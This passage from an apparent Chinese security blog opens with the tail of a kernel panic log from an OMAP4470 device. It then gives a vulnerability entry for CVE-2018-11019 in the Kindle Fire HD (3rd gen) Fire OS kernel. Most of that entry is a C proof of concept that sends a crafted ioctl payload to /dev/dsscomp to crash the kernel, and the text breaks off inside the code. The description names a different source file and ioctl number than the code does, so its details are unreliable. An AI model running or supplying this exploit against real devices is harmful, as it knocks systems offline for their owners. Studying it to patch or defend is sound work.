d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540 c35b5edc c35b5e90</span><br><span class="line">[  147.503631] 5e88  c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8 c00723a0 000fffff</span><br><span class="line">[  147.514160] 5ea8  b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14 00000000 00000001</span><br><span class="line">[  147.524688] 5ec8  de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000 d72400c0 00000004</span><br><span class="line">[  147.535339] 5ee8  d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 c35b5f08 c0136044 c0489e60</span><br><span class="line">[  147.546020] 5f08  00000000 00000000 00000000 00000001 00000000 dd055190 dd5e7f68 c35b5f0c</span><br><span class="line">[  147.556579] Process rpmsg_omx_ioctl (pid: 3888, stack limit &#x3D; 0xc35b42f8)</span><br><span class="line">[  147.564270] Stack: (0xc35b5e60 to 0xc35b6000)</span><br><span class="line">[  147.569213] 5e60: d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540</span><br><span class="line">[  147.578430] 5e80: c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8</span><br><span class="line">[  147.587646] 5ea0: c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14</span><br><span class="line">[  147.596740] 5ec0: 00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000</span><br><span class="line">[  147.605957] 5ee0: d72400c0 00000004 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 c35b5f08</span><br><span class="line">[  147.615173] 5f00: c0136044 c0489e60 00000000 00000000 00000000 00000001 00000000 dd055190</span><br><span class="line">[  147.624389] 5f20: dd5e7f68 c35b5f0c c35b4000 be92f628 be92f5f8 c0085803 d72400c0 00000004</span><br><span class="line">[  147.633483] 5f40: c35b4000 00000000 c35b5f64 00000000 be92f5f8 c0085803 d72400c0 00000004</span><br><span class="line">[  147.642730] 5f60: c35b4000 00000000 c35b5fa4 c35b5f78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[  147.651947] 5f80: 00000400 be92f628 00010e54 00000000 00000036 c0013e08 00000000 c35b5fa8</span><br><span class="line">[  147.661010] 5fa0: c0013c60 c0136578 be92f628 00010e54 00000004 c0085803 be92f5f8 be92f5f8</span><br><span class="line">[  147.670104] 5fc0: be92f628 00010e54 00000000 00000036 00000000 00000000 00000000 be92f614</span><br><span class="line">[  147.679321] 5fe0: 00000000 be92f5dc 00010690 0002917c 60000010 00000004 00000017 579e6e78</span><br><span class="line">[  147.688537] Backtrace: </span><br><span class="line">[  147.691558] [&lt;c02e8534&gt;] (ion_free+0x0&#x2F;0xb4) from [&lt;c048a120&gt;] (rpmsg_omx_ioctl+0x2cc&#x2F;0x598)</span><br><span class="line">[  147.701049]  r6:00000003 r5:d71d5880 r4:be92f5f8 r3:d71d58ec</span><br><span class="line">[  147.708068] [&lt;c0489e54&gt;] (rpmsg_omx_ioctl+0x0&#x2F;0x598) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[  147.717956] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[  147.727203] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[  147.736450]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e54 r4:be92f628</span><br><span class="line">[  147.744873] Code: e7f001f2 e1a0c00d e92dd878 e24cb004 (e5915004) </span><br><span class="line">[  147.754913] Board Information: </span><br><span class="line">[  147.754913]  Revision : 0001</span><br><span class="line">[  147.754943]  Serial	: 0000000000000000</span><br><span class="line">[  147.754943] SoC Information:</span><br><span class="line">[  147.754943]  CPU	: OMAP4470</span><br><span class="line">[  147.754943]  Rev	: ES1.0</span><br><span class="line">[  147.754974]  Type	: HS</span><br><span class="line">[  147.754974]  Production ID: 0002B975-000000CC</span><br><span class="line">[  147.754974]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[  147.755004] </span><br><span class="line">[  147.794616] ---[ end trace 50912198cfc81720 ]---</span><br><span class="line">[  147.799957] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[  147.805847] CPU0: stopping</span><br><span class="line">[  147.808959] Backtrace: </span><br><span class="line">[  147.812133] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[  147.821502]  r6:c09ddc50 r5:c09dc844 r4:00000000 r3:c0a0e950</span><br><span class="line">[  147.828643] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[  147.837860] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[  147.847259] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40&#x2F;0x70)</span><br><span class="line">[  147.856567] Exception stack(0xdd187b38 to 0xdd187b80)</span><br><span class="line">[  147.862243] 7b20:                                                       00000002 00000002</span><br><span class="line">[  147.871459] 7b40: 00000002 00000001 dd187bbc c1621100 c1621100 00c6a000 c1621108 00000001</span><br><span class="line">[  147.880676] 7b60: 00000001 dd187bac 00000002 dd187b80 c002398c c009ae48 200d0013 ffffffff</span><br><span class="line">[  147.889892]  r6:ffffffff r5:200d0013 r4:c009ae48 r3:c002398c</span><br><span class="line">[  147.896911] [&lt;c009add0&gt;] (generic_exec_single+0x0&#x2F;0x98) from [&lt;c009af78&gt;] (smp_call_function_single+0x110&#x2F;0x1e0)</span><br><span class="line">[  147.908325] [&lt;c009ae68&gt;] (smp_call_function_single+0x0&#x2F;0x1e0) from [&lt;c009b28c&gt;] (smp_call_function_many+0x244&#x2F;0x294)</span><br><span class="line">[  147.920104] [&lt;c009b048&gt;] (smp_call_function_many+0x0&#x2F;0x294) from [&lt;c009b48c&gt;] (smp_call_function+0x48&#x2F;0x74)</span><br><span class="line">[  147.931030] [&lt;c009b444&gt;] (smp_call_function+0x0&#x2F;0x74) from [&lt;c04310f4&gt;] (cpuidle_latency_notify+0x20&#x2F;0x28)</span><br><span class="line">[  147.941864]  r4:ffffffff r3:c04310d4</span><br><span class="line">[  147.946258] [&lt;c04310d4&gt;] (cpuidle_latency_notify+0x0&#x2F;0x28) from [&lt;c06a7154&gt;] (notifier_call_chain+0x4c&#x2F;0x8c)</span><br><span class="line">[  147.957305] [&lt;c06a7108&gt;] (notifier_call_chain+0x0&#x2F;0x8c) from [&lt;c006ebc0&gt;] (__blocking_notifier_call_chain+0x50&#x2F;0x68)</span><br><span class="line">[  147.969085]  r8:200d0013 r7:000000a0 r6:00000000 r5:ffffffff r4:c0a11df8</span><br><span class="line">[  147.977020] r3:ffffffff</span><br><span class="line">[  147.980499] [&lt;c006eb70&gt;] (__blocking_notifier_call_chain+0x0&#x2F;0x68) from [&lt;c006ebf8&gt;] (blocking_notifier_call_chain+0x20&#x2F;0x28)</span><br><span class="line">[  147.993133]  r7:de95183c r6:000000a0 r5:0000115c r4:c0a11d98</span><br><span class="line">[  148.000152] [&lt;c006ebd8&gt;] (blocking_notifier_call_chain+0x0&#x2F;0x28) from [&lt;c0088eec&gt;] (pm_qos_update_target+0xf8&#x2F;0x19c)</span><br><span class="line">[  148.011932] [&lt;c0088df4&gt;] (pm_qos_update_target+0x0&#x2F;0x19c) from [&lt;c008909c&gt;] (pm_qos_update_request+0x5c&#x2F;0x8c)</span><br><span class="line">[  148.023071] [&lt;c0089040&gt;] (pm_qos_update_request+0x0&#x2F;0x8c) from [&lt;c0411b18&gt;] (omap_i2c_xfer+0x2bc&#x2F;0x6c8)</span><br><span class="line">[  148.033599]  r5:dd187da0 r4:00000000</span><br><span class="line">[  148.038024] [&lt;c041185c&gt;] (omap_i2c_xfer+0x0&#x2F;0x6c8) from [&lt;c040e5cc&gt;] (i2c_transfer+0xb8&#x2F;0xf8)</span><br><span class="line">[  148.047637] [&lt;c040e514&gt;] (i2c_transfer+0x0&#x2F;0xf8) from [&lt;c040e930&gt;] (i2c_smbus_xfer+0x278&#x2F;0x588)</span><br><span class="line">[  148.057434] [&lt;c040e6b8&gt;] (i2c_smbus_xfer+0x0&#x2F;0x588) from [&lt;c040eedc&gt;] (i2c_smbus_read_word_data+0x3c&#x2F;0x4c)</span><br><span class="line">[  148.068267] [&lt;c040eea0&gt;] (i2c_smbus_read_word_data+0x0&#x2F;0x4c) from [&lt;c0418760&gt;] (bq27541_i2c_read.constprop.7+0x20&#x2F;0x54)</span><br><span class="line">[  148.080200] [&lt;c0418740&gt;] (bq27541_i2c_read.constprop.7+0x0&#x2F;0x54) from [&lt;c04189f0&gt;] (battery_handle_work+0x120&#x2F;0x6a4)</span><br><span class="line">[  148.091857]  r5:dd187e92 r4:dd08b920</span><br><span class="line">[  148.096374] [&lt;c04188d0&gt;] (battery_handle_work+0x0&#x2F;0x6a4) from [&lt;c0063278&gt;] (process_one_work+0x150&#x2F;0x468)</span><br><span class="line">[  148.107116] [&lt;c0063128&gt;] (process_one_work+0x0&#x2F;0x468) from [&lt;c00638c4&gt;] (worker_thread+0x13c&#x2F;0x320)</span><br><span class="line">[  148.117156] [&lt;c0063788&gt;] (worker_thread+0x0&#x2F;0x320) from [&lt;c0068af4&gt;] (kthread+0x90&#x2F;0x9c)</span><br><span class="line">[  148.126312] [&lt;c0068a64&gt;] (kthread+0x0&#x2F;0x9c) from [&lt;c004cd64&gt;] (do_exit+0x0&#x2F;0x7e0)</span><br><span class="line">[  148.134765]  r6:c004cd64 r5:c0068a64 r4:dd0aded4</span><br><span class="line">[  148.140533] CPU0 PC (0) : 0xc0019b2c</span><br><span class="line">[  148.144714] CPU0 PC (1) : 0xc0019b2c</span><br><span class="line">[  148.148773] CPU0 PC (2) : 0xc0019b2c</span><br><span class="line">[  148.152832] CPU0 PC (3) : 0xc0019b2c</span><br><span class="line">[  148.156890] CPU0 PC (4) : 0xc0019b2c</span><br><span class="line">[  148.161071] CPU0 PC (5) : 0xc0019b2c</span><br><span class="line">[  148.165130] CPU0 PC (6) : 0xc0019b2c</span><br><span class="line">[  148.169189] CPU0 PC (7) : 0xc0019b2c</span><br><span class="line">[  148.173370] CPU0 PC (8) : 0xc0019b2c</span><br><span class="line">[  148.177429] CPU0 PC (9) : 0xc0019b2c</span><br><span class="line">[  148.181488] CPU1 PC (0) : 0xc003ee38</span><br><span class="line">[  148.185668] CPU1 PC (1) : 0xc003ee54</span><br><span class="line">[  148.189727] CPU1 PC (2) : 0xc003ee54</span><br><span class="line">[  148.193786] CPU1 PC (3) : 0xc003ee54</span><br><span class="line">[  148.197967] CPU1 PC (4) : 0xc003ee54</span><br><span class="line">[  148.202026] CPU1 PC (5) : 0xc003ee54</span><br><span class="line">[  148.206085] CPU1 PC (6) : 0xc003ee54</span><br><span class="line">[  148.210266] CPU1 PC (7) : 0xc003ee54</span><br><span class="line">[  148.214324] CPU1 PC (8) : 0xc003ee54</span><br><span class="line">[  148.218383] CPU1 PC (9) : 0xc003ee54</span><br><span class="line">[  148.222442] </span><br><span class="line">[  148.224365] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[  148.224365] </span><br></pre></td></tr></table></figure>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2020-09-12T15:12:00.000Z" title="2020-09-12T15:12:00.000Z">2020-09-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-09-12T15:15:36.130Z" title="2020-09-12T15:15:36.130Z">2020-09-12</time></span><span class="level-item"><a class="link-muted" href="/categories/IOT/">IOT</a></span><span class="level-item">14 minutes read (About 2120 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11019%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">（CVE-2018-11019）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</a></h1><div class="content"><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Amazon Kindle Fire HD（3rd）是美国亚马逊（Amazon）公司的一款Fire OS平板电脑设备。Fire OS是运行在其中的一套专用于Amazon设备的基于Android开发的移动操作系统。kernel是其中的一个内核组件。 Amazon Kindle Fire HD(3rd) Fire OS 4.5.5.3版本中的kernel组件的kernel/omap/drivers/misc/gcx/gcioctl/gcif.c文件存在安全漏洞。攻击者可借助3221773726命令利用该漏洞注入特制的参数，造成内核崩溃。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<p>-</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.</span></span><br><span class="line"><span class="comment"> * Related buggy struct name is dsscomp_setup_dispc_data.</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/dsscomp.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The fowllwing is kmsg of kernel crash infomation:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/dsscomp&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">1118064517</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123;</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000003</span>,</span><br><span class="line">    <span class="number">0x5d200040</span>,</span><br><span class="line">    <span class="number">0x79900008</span>,</span><br><span class="line">    <span class="number">0x8f5928bd</span>,</span><br><span class="line">    <span class="number">0x78b02422</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xf4c50400</span>,</span><br><span class="line">    <span class="number">0x007fffff</span>,</span><br><span class="line">    <span class="number">0x8499f562</span>,</span><br><span class="line">    <span class="number">0xffff0400</span>,</span><br><span class="line">    <span class="number">0x001b131d</span>,</span><br><span class="line">    <span class="number">0x60818210</span>,</span><br><span class="line">    <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x9da9041c</span>,</span><br><span class="line">    <span class="number">0xcd980400</span>,</span><br><span class="line">    <span class="number">0x001f03f4</span>,</span><br><span class="line">    <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0x2a34003f</span>,</span><br><span class="line">    <span class="number">0x7c80d8f3</span>,</span><br><span class="line">    <span class="number">0x63102627</span>,</span><br><span class="line">    <span class="number">0xc73643a8</span>,</span><br><span class="line">    <span class="number">0xa28f0665</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x689e57b4</span>,</span><br><span class="line">    <span class="number">0x01ff0008</span>,</span><br><span class="line">    <span class="number">0x5e7324b1</span>,</span><br><span class="line">    <span class="number">0xae3b003f</span>,</span><br><span class="line">    <span class="number">0x0b174d86</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0x21ffff37</span>,</span><br><span class="line">    <span class="number">0xceb367a4</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xec000f9e</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x000001ff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x0000000f</span>,</span><br><span class="line">    <span class="number">0x0425c069</span>,</span><br><span class="line">    <span class="number">0x038cc3be</span>,</span><br><span class="line">    <span class="number">0x0000000f</span>,</span><br><span class="line">    <span class="number">0x00000080</span>,</span><br><span class="line">    <span class="number">0xe5790100</span>,</span><br><span class="line">    <span class="number">0x5b1bffff</span>,</span><br><span class="line">    <span class="number">0x0000d355</span>,</span><br><span class="line">    <span class="number">0x0000c685</span>,</span><br><span class="line">    <span class="number">0xa0070000</span>,</span><br><span class="line">    <span class="number">0x0010ffff</span>,</span><br><span class="line">    <span class="number">0x00a0ff00</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff490700</span>,</span><br><span class="line">    <span class="number">0x0832ad03</span>,</span><br><span class="line">    <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x81f871c0</span>,</span><br><span class="line">    <span class="number">0x738019cb</span>,</span><br><span class="line">    <span class="number">0xbf47ffff</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x7f190f33</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8295769b</span>,</span><br><span class="line">    <span class="number">0x0000003f</span>,</span><br><span class="line">    <span class="number">0x869f2295</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xd673914f</span>,</span><br><span class="line">    <span class="number">0x05055800</span>,</span><br><span class="line">    <span class="number">0xed69b7d5</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x0107ebbd</span>,</span><br><span class="line">    <span class="number">0xd214af8d</span>,</span><br><span class="line">    <span class="number">0xffff4a93</span>,</span><br><span class="line">    <span class="number">0x26450008</span>,</span><br><span class="line">    <span class="number">0x58df0000</span>,</span><br><span class="line">    <span class="number">0xd16db084</span>,</span><br><span class="line">    <span class="number">0x03ff30dd</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x209aff3b</span>,</span><br><span class="line">    <span class="number">0xe7850800</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x30da815c</span>,</span><br><span class="line">    <span class="number">0x426f5105</span>,</span><br><span class="line">    <span class="number">0x0de109d7</span>,</span><br><span class="line">    <span class="number">0x2c1a65fc</span>,</span><br><span class="line">    <span class="number">0xfcb3d75f</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8066be5b</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x5cf232ec</span>,</span><br><span class="line">    <span class="number">0x680d1469</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000020</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0xd1d12be8</span>,</span><br><span class="line">    <span class="number">0x02010200</span>,</span><br><span class="line">    <span class="number">0x01ffc16f</span>,</span><br><span class="line">    <span class="number">0xf6e237e6</span>,</span><br><span class="line">    <span class="number">0x007f0000</span>,</span><br><span class="line">    <span class="number">0x01ff08f8</span>,</span><br><span class="line">    <span class="number">0x000f00f9</span>,</span><br><span class="line">    <span class="number">0xbad07695</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xbaff0000</span>,</span><br><span class="line">    <span class="number">0x24040040</span>,</span><br><span class="line">    <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xbc2e9242</span>,</span><br><span class="line">    <span class="number">0x009f5f08</span>,</span><br><span class="line">    <span class="number">0x00800000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff8800ff</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x000003f4</span>,</span><br><span class="line">    <span class="number">0x6faa8472</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0xec857dd5</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x3f004874</span>,</span><br><span class="line">    <span class="number">0x0000b77a</span>,</span><br><span class="line">    <span class="number">0xec9acb95</span>,</span><br><span class="line">    <span class="number">0xfacc0001</span>,</span><br><span class="line">    <span class="number">0xffff0001</span>,</span><br><span class="line">    <span class="number">0x0080ffff</span>,</span><br><span class="line">    <span class="number">0x3600ff03</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8fff7d7f</span>,</span><br><span class="line">    <span class="number">0x6b87075a</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x001001ff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff1f0512</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x51e32167</span>,</span><br><span class="line">    <span class="number">0xc18c55cc</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xb4aaf12b</span>,</span><br><span class="line">    <span class="number">0x86edfdbd</span>,</span><br><span class="line">    <span class="number">0x00000010</span>,</span><br><span class="line">    <span class="number">0x0000003f</span>,</span><br><span class="line">    <span class="number">0xabff7b00</span>,</span><br><span class="line">    <span class="number">0xffff9ea3</span>,</span><br><span class="line">    <span class="number">0xb28e0040</span>,</span><br><span class="line">    <span class="number">0x000fffff</span>,</span><br><span class="line">    <span class="number">0x458603f4</span>,</span><br><span class="line">    <span class="number">0xffff007f</span>,</span><br><span class="line">    <span class="number">0xa9030f02</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x002cffff</span>,</span><br><span class="line">    <span class="number">0x9e00cdff</span>,</span><br><span class="line">    <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span 